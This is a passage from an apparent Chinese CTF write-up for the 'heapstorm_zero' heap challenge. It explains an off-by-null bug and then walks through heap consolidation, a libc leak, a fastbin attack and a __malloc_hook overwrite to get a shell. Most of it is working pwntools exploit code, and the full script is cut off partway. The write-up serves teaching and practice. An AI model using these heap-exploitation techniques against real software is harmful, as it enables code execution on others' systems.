class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span 